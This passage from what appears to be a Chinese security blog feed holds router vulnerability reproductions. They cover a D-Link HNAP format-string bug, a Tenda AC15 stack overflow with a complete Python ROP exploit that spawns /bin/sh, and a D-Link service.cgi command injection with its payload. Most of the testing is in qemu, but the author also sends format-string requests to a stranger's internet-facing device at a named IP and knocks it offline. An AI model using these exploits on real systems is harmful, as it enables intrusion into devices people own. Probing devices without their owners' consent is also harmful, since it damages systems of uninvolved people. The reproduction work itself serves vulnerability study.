        <content type="html"><![CDATA[<h1 id="ZDI-CAN-11360-格式化字符串漏洞复现"><a href="#ZDI-CAN-11360-格式化字符串漏洞复现" class="headerlink" title="ZDI-CAN-11360 格式化字符串漏洞复现"></a>ZDI-CAN-11360 格式化字符串漏洞复现</h1><h2 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h2><ul><li><p>漏洞固件 <a href="http://www.dlinktw.com.tw/techsupport/download.ashx?file=11617">http://www.dlinktw.com.tw/techsupport/download.ashx?file=11617</a></p><p>版本号为 v1.09</p></li><li><p>qemu v5.2</p></li><li><p>Ubuntu 18.04</p></li><li><p>ida 7.5</p></li></ul><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>将用户可控的 cookie 的 uid 字段作为格式化字符串使用。</p><p>二进制文件在 <code>./web/cgi-bin/hnap/hnap_service</code> ，定位到 Login 函数的 136 行附近：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">v6 = getenv(<span class="string">&quot;COOKIE&quot;</span>);                        <span class="comment">// 提取cookie，这个提取是判断是否存在cookie</span></span><br><span class="line"><span class="keyword">if</span> ( v6 &amp;&amp; *v6 )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">memset</span>(v44, <span class="number">0</span>, <span class="keyword">sizeof</span>(v44));</span><br><span class="line">  v8 = getenv(<span class="string">&quot;COOKIE&quot;</span>);</span><br><span class="line">  <span class="built_in">snprintf</span>(v44, <span class="number">128u</span>, <span class="string">&quot;%s&quot;</span>, v8);              <span class="comment">// 将cookie以字符串形式存入v44</span></span><br><span class="line">  v9 = <span class="built_in">strstr</span>(v44, <span class="string">&quot;uid=&quot;</span>);                   <span class="comment">// 匹配出cookie的uid字段</span></span><br><span class="line">  <span class="keyword">if</span> ( v9 )                                   <span class="comment">// 包含uid</span></span><br><span class="line">  &#123;</span><br><span class="line">    v10 = v9 + <span class="number">4</span>;                             <span class="comment">// 跳过uid=</span></span><br><span class="line">    v11 = <span class="built_in">strchr</span>(v9 + <span class="number">4</span>, <span class="string">&#x27;;&#x27;</span>);                <span class="comment">// 提取纯净uid</span></span><br><span class="line">    <span class="keyword">if</span> ( v11 )</span><br><span class="line">      *v11 = <span class="string">&#x27;\0&#x27;</span>;                            <span class="comment">// 补上一个结束符</span></span><br><span class="line">    <span class="built_in">snprintf</span>((<span class="keyword">char</span> *)v40, <span class="number">11u</span>, v10);          <span class="comment">// 格式化字符串漏洞</span></span><br><span class="line">                                              <span class="comment">// v10为用户控制内容，被作为格式化字符串写入</span></span><br><span class="line">                                              <span class="comment">// snprintf(ptr,size,format,string,...)</span></span><br><span class="line">    v12 = (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v57[<span class="number">9</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>                                        <span class="comment">// 不包含uid</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">snprintf</span>((<span class="keyword">char</span> *)v40, <span class="number">11u</span>, v44);</span><br><span class="line">    v12 = (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v57[<span class="number">9</span>];</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>Getenv 获取 cookie 放入 v8 ，用 snprintf 写入到 v44 ，这里使用没有问题，用户可控的 v8 是作为格式化字符串的参数。后面进一步提取 uid 的值存放在 v10 ，用 snprintf 将 v10 写入 v40 ，对比上面 snprintf 明显看出来：用户可控的 v10 被当做是格式化字符串，相当于 ctf 的 <code>printf(v10);</code> 。</p><p>qemu 仿真测试没搞懂流量包怎么传进去，应该在 78 行。84 行处理传入的数据包，92 行调用 Login 。</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210216154300.png" alt="image-20210216154253469"></p><p>到公网上找个设备复现。访问 <code>/hnap/hnap_service</code> 会返回设备信息，FirmwareVersion 就是固件版本信息：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210216155118.png" alt="image-20210216155118459"></p><p>根据先前分析处理数据报函数可以大致数据报 content 要有什么东西。</p><p>由于漏洞位于处理 HNAP 请求的逻辑中，我们可以把其他 Dlink 设备的 HNAP 请求照搬过来（from CataLpa）。没有 DLink 设备，复制一下师傅的例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;hnap&#x2F;hnap_service HTTP&#x2F;1.1</span><br><span class="line">Host: 61.93.85.63</span><br><span class="line">SOAPAction: &quot;http:&#x2F;&#x2F;purenetworks.com&#x2F;HNAP1&#x2F;Login&quot;</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.141 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: uid&#x3D;aaaa;</span><br><span class="line">Content-Length: 374</span><br><span class="line"></span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;&lt;soap:Envelope xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot; xmlns:xsd&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema&quot; xmlns:soap&#x3D;&quot;http:&#x2F;&#x2F;schemas.xmlsoap.org&#x2F;soap&#x2F;envelope&#x2F;&quot;&gt;&lt;soap:Body&gt;&lt;Login xmlns&#x3D;&quot;http:&#x2F;&#x2F;purenetworks.com&#x2F;HNAP1&#x2F;&quot;&gt;&lt;Action&gt;login&lt;&#x2F;Action&gt;&lt;Username&gt;&lt;&#x2F;Username&gt;&lt;LoginPassword&gt;&lt;&#x2F;LoginPassword&gt;&lt;&#x2F;Login&gt;&lt;&#x2F;soap:Body&gt;&lt;&#x2F;soap:Envelope&gt;</span><br></pre></td></tr></table></figure><p>有回显，结果如下：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210216155718.png" alt="image-20210216155718558"></p><p>将 uid 改成格式化字符串访问不存在地址，让系统报错没有回显，系统应该是会重启，服务就暂停一会：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210216160046.png" alt="image-20210216160046057"></p>]]></content>
      
      
      <categories>
          
          <category> IOT </category>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ZDI-CAN-11360 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ida反编译后查找函数外部库方法</title>
      <link href="archives/26741a3d/"/>
      <url>archives/26741a3d/</url>
      
        <content type="html"><![CDATA[<h1 id="ida反编译后查找函数外部哪个库方法"><a href="#ida反编译后查找函数外部哪个库方法" class="headerlink" title="ida反编译后查找函数外部哪个库方法"></a>ida反编译后查找函数外部哪个库方法</h1><p>研究路由器固件时，这个函数调用外部函数库中的 <code>usrGetPass</code> ：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210216223450.png" alt="image-20210216223450479"></p><p>切换到固件根目录后：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -rn &quot;usrGetPass&quot;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210216223824.png" alt="image-20210216223824489"></p><p>匹配出含有 <code>usrGetPass</code> 的文件，第一个是分析的文件，第二个就是要找的动态函数库。</p><p>在 ida 开头也有记录需要哪些外部函数库：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210216224733.png" alt="image-20210216224733494"></p>]]></content>
      
      
      
        <tags>
            
            <tag> ida </tag>
            
            <tag> grep </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2018-5767 栈溢出漏洞复现</title>
      <link href="archives/266/"/>
      <url>archives/266/</url>
      
        <content type="html"><![CDATA[<p>TENDA-AC15 型号路由器上的一个漏洞，产生原因是没有限制用户输入，使用 sscanf 直接将输入拷贝到栈上，导致栈溢出。</p><h2 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h2><ul><li><p>漏洞固件在官网没找着，去百度找到了，地址在<a href="http://www.kuaihou.com/soft/311837.html">这里</a></p><p>版本号：V15.03.1.16</p></li><li><p>qemu v5.2</p></li><li><p>Ubuntu 18.04</p></li><li><p>ida 7.5</p></li></ul><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210210113356.png" alt="image-20210210113356276"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>需要配置好 qemu 桥接网络，不能就去 patch 一下 check_network 的返回值。</p><h3 id="设置桥接网络"><a href="#设置桥接网络" class="headerlink" title="设置桥接网络"></a>设置桥接网络</h3><p>安装依赖：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install bridge-utils uml-utilities</span><br></pre></td></tr></table></figure><p>修改 <code> /etc/network/interfaces</code> 网卡配置文件如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># interfaces(5) file used by ifup(8) and ifdown(8)</span><br><span class="line">auto lo</span><br><span class="line">iface lo inet loopback</span><br><span class="line"></span><br><span class="line">auto ens33</span><br><span class="line">iface ens33 inet manual</span><br><span class="line">up ifconfig ens33 0.0.0.0 up</span><br><span class="line"></span><br><span class="line">auto br0</span><br><span class="line">iface br0 inet dhcp</span><br><span class="line">bridge_ports ens33</span><br><span class="line">bridge_stp off</span><br><span class="line">bridge_maxwait 0</span><br></pre></td></tr></table></figure><p>修改 qemu 网络脚本 <code>/etc/qemu-ifup</code> 为如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#! &#x2F;bin&#x2F;sh</span><br><span class="line">echo &quot;Executing &#x2F;etc&#x2F;qemu-ifup&quot;</span><br><span class="line">echo &quot;Bringing up $1 for bridged mode...&quot;</span><br><span class="line">sudo &#x2F;sbin&#x2F;ifconfig $1 0.0.0.0 promisc up</span><br><span class="line">echo &quot;Adding $1 to br0&quot;</span><br><span class="line">sudo &#x2F;sbin&#x2F;brctl addif br0 $1</span><br><span class="line">sleep 3</span><br></pre></td></tr></table></figure><p>给脚本加上权限，重启网络服务，如果连不上网可以重启一下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo chmod a+x /etc/qemu-ifup</span><br><span class="line">sudo /etc/init.d/networking restart</span><br><span class="line">sudo ifdown ens33</span><br><span class="line">sudo ifup br0</span><br></pre></td></tr></table></figure><p>运行程序还是报错，通过字符串定位到 <code>ConnectCfm</code> 函数，看不到函数体，应该是在其他文件定义的，这里也要 patch 改下跳转条件：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210210124651.png" alt="image-20210210124651672"></p><p>然后就能正常运行 httpd 服务（如果 check_network 检查是 patch 解决的，这里 ip 会有点诡异）：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210210124735.png" alt="image-20210210124735721"></p><p>在 <code>R7WebsSecurityHandler</code> 开头打上断点，这个函数处理 <code>/goform/execCommand</code> 的请求：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210210131807.png" alt="image-20210210131807628"></p><p>用 burpsuite 给 <code>/goform/execCommand</code> 发个包，加上 Cookie 的 password 属性，长度弄长点：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;goform&#x2F;execCommand HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.211.7</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.16; rv:85.0) Gecko&#x2F;20100101 Firefox&#x2F;85.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cookie: password&#x3D;&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br></pre></td></tr></table></figure><p>当检索 password 属性后将值经过 sscanf 正则过滤后存放到 v34 的字符串列表局部变量：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210210140729.png" alt="image-20210210140543403"></p><p>继续运行就会报段错误退出：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210210141320.png" alt="image-20210210141320615"></p><p>用 gdb-multiarch 跟一下，查看一下地址信息。发现是在一个 if 判断中退出报错，而不是在 R7WebsSecurityHandler 退出，这样控制程序流有点复杂：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210211012033.png" alt="image-20210211012033940"></p><p>根据规则如果 URL 文件后缀不是 gif 才进入 if 函数体，那么就加一个 <code>.gif</code> 让程序流直接从 R7WebsSecurityHandler 返回，这样控制起来就简单多。</p><p>然后用 cycli 生成字符串测量长度，要注意加 1 再算 padding ，得出长度为 447 。成功控制返回地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;Cookie&#39;: password&#x3D;&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaSKYEaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.gifbbbbzzzz&quot;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210211232722.png" alt="image-20210211232722219"></p><h3 id="ROP-利用链"><a href="#ROP-利用链" class="headerlink" title="ROP 利用链"></a>ROP 利用链</h3><p>arm 返回地址是在 pc 寄存器，不是在栈上。qemu 虚拟机没有随机化地址。</p><p>构造出 <code>system(&#39;/bin/sh&#39;)</code> ，<code>/bin/sh</code> 长度超过 4 字节，由于对齐要占据 8 字节空间，<code>pop r0,pc</code> gadget 不能直接用了。</p><p>先用 <code>pop r3,pc</code> 将 system 放到 r3 ，同时压入 <code> mov r0,sp;blx r3</code> ，这时 sp 寄存器指向 /bin/sh ，将参数地址移动到 r0 ，然后跳转 r3 地址。</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210211234133.png" alt="image-20210211234133733"></p><p>qemu 需要加上 -strace 查看调用：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210211234504.png" alt="image-20210211153837937"></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;192.168.211.7&quot;</span></span><br><span class="line">command = <span class="string">&quot;/bin/sh\x00&quot;</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://&#123;:s&#125;/goform/exeCommand&quot;</span>.<span class="built_in">format</span>(ip)</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:85.0) Gecko/20100101 Firefox/85.0&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;close&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;password=&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaSKYEaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.gifbbbbzzzz&quot;&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Cache-Control&#x27;</span>: <span class="string">&#x27;max-age=0&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">libc = <span class="number">0x3fde6000</span></span><br><span class="line">pop_r3_pc = struct.pack(<span class="string">&quot;&lt; I&quot;</span>,<span class="number">0x00018298</span>+libc)<span class="comment">#pop r3 pc</span></span><br><span class="line">mov_r0_sp_blx_r3 = struct.pack(<span class="string">&quot;&lt; I&quot;</span>, <span class="number">0x00040cb8</span> + libc)<span class="comment"># mov r0 sp; blx r3</span></span><br><span class="line">system = struct.pack(<span class="string">&quot;&lt; I&quot;</span>, <span class="number">0x0005A270</span>+libc)</span><br><span class="line">command = command.encode()<span class="comment"># &#x27;byte&#x27;</span></span><br><span class="line">password = <span class="string">b&quot;A&quot;</span> * <span class="number">444</span>+<span class="string">b&quot;.gif&quot;</span>+pop_r3_pc+system+mov_r0_sp_blx_r3+command</span><br><span class="line">headers[<span class="string">&#x27;Cookie&#x27;</span>]=<span class="string">b&quot;password=&quot;</span>+password</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    response = requests.get(url,headers=headers,timeout=<span class="number">1</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.freebuf.com/articles/wireless/166869.html">https://www.freebuf.com/articles/wireless/166869.html</a></p><p><a href="https://wzt.ac.cn/2019/03/19/CVE-2018-5767/">https://wzt.ac.cn/2019/03/19/CVE-2018-5767/</a></p>]]></content>
      
      
      <categories>
          
          <category> IOT </category>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tenda </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CNVD-2018-01084 远程代码执行复现</title>
      <link href="archives/224/"/>
      <url>archives/224/</url>
      
        <content type="html"><![CDATA[<p>Dlink DIR 615/645/815 路由上远程代码执行漏洞。漏洞存在于 <code>/htdocs/cgibin</code> 二进制文件中，原因是 <code>service.cgi</code> 中未经过滤就将用户输入拼接到命令中。</p><h2 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h2><ul><li>漏洞固件 <a href="https://tsd.dlink.com.tw/ddgo">Firmware:DIR-645_A1_FW: v1.02b08 (for WW)</a> （tw官网选择 DIR-645 第一个文件）<br>版本号为 v1.02（v1.03完成修复）</li><li>qemu v5.2</li><li>Ubuntu 18.04</li><li>ida 7.5（能搞 mips 反编译工具都行）</li></ul><p>直接运行如下：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209215850.png" alt="image-20210209215850264"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p><code>strrchr</code> 匹配出 <code>/</code> 后面的参数后，<code>strcmp</code> 匹配参数进入各个服务函数：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209215638.png" alt="image-20210209215637987"></p><p>定位到 <code>servicecgi_main</code> 。<code>getenv</code> 提取参数依据两种请求方式分别给 v2 赋值，不匹配或为空则退出；提取请求方式后，将参数传入 <code>cgibin_parse_request</code> 解析 http 请求：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209220241.png" alt="image-20210209220241088"></p><p>到里面分别提取<code>REQUEST_URI</code>、 <code>CONTENT_TYPE</code>、<code>CONTENT_LENGTH</code>  ，</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209221145.png" alt="image-20210209221145009"></p><p>当解析无误后返回上层函数，然后进入权限认证：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209221306.png" alt="image-20210209221306768"></p><p>在这个认证函数内部的函数 <code>sess_get_uid</code> ，可以看到是从 HTTP_COOKIE 里面获取 uid 判断：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209221716.png" alt="image-20210209221716723"></p><p>进入 <code> sub_40A950</code> 将 URL ？ 后面部分与关键词匹配，如果一致就开始准备进入拼接命令字符串：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209222749.png" alt="image-20210209222749033"></p><p><code>lxmldbc_system</code> 里面将预制指令和 URL 里面参数进行拼接：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209222937.png" alt="image-20210209222937398"></p><p>Event 命令字符串为：<code>&quot;event %s &gt; /dev/null&quot;</code> ，中间我们可以加上任意指令比如：<code>&quot;event &amp;ls&amp; &gt; /dev/null&quot;</code></p><p>开始测试前，权限认证那里由于少文件等，要将那个函数 patch 改一下。把跳转 session 改掉不然会卡一段时间，因为仿真没有 <code>/var/session</code> 文件；v1 的复制改为 1 就是代表有权限：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209232026.png" alt="image-20210209232026784"></p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209231657.png" alt="image-20210209231657216"></p><p>测试一下，启动命令：</p><blockquote><p>-0：传入第一个参数，进入 servicecgi_main</p><p>-E：选项传入自定义的环境变量</p><p>-strace：显示具体信息</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo chroot . ./qemu-mipsel \</span><br><span class="line">-0 &quot;service.cgi&quot; \</span><br><span class="line">-E REQUEST_METHOD=&quot;POST&quot; \</span><br><span class="line">-E CONTENT_LENGTH=10 \</span><br><span class="line">-E REQUEST_URI=&quot;service.cgi?EVENT=%26ls%26&quot; \</span><br><span class="line">-E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; \</span><br><span class="line">-E HTTP_COOKIE=&quot;uid=skye231&quot; \</span><br><span class="line">./htdocs/cgibin </span><br></pre></td></tr></table></figure><p>启动后，报错解析不了：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209230233.png" alt="image-20210209230233246"></p><p>加上调试解析函数看都是解析正确，单步调试就发现是成功解析后执行 retrun 函数并没有返回到上一层，而是继续往下执行 95 行的 retrun v9 这是的 v9 为 -1 ：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209231306.png" alt="image-20210209231306395"></p><p>cataLpa 师傅复现文章也出现相同情况，推测可能是 qemu 仿真问题。这里可以直接改寄存器或者 patch 一下。</p><p>再次启动，这次就正常回显，但是没有运行附加进去的指令：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209232205.png" alt="image-20210209232205679"></p><p>附加上 <code>-strace</code> 查看一下详细信息：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo chroot . ./qemu-mipsel -g 1234 -strace \</span><br><span class="line">-0 &quot;service.cgi&quot; \</span><br><span class="line">-E REQUEST_METHOD=&quot;POST&quot; \</span><br><span class="line">-E CONTENT_LENGTH=10 \</span><br><span class="line">-E REQUEST_URI=&quot;service.cgi?EVENT=%26ls%26&quot; \</span><br><span class="line">-E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; \</span><br><span class="line">-E HTTP_COOKIE=&quot;uid=skye231&quot; \</span><br><span class="line">./htdocs/cgibin </span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209233118.png" alt="image-20210209233118432"></p><p>指令已经附加上去，应该是 qemu 环境问题运行不了。</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a 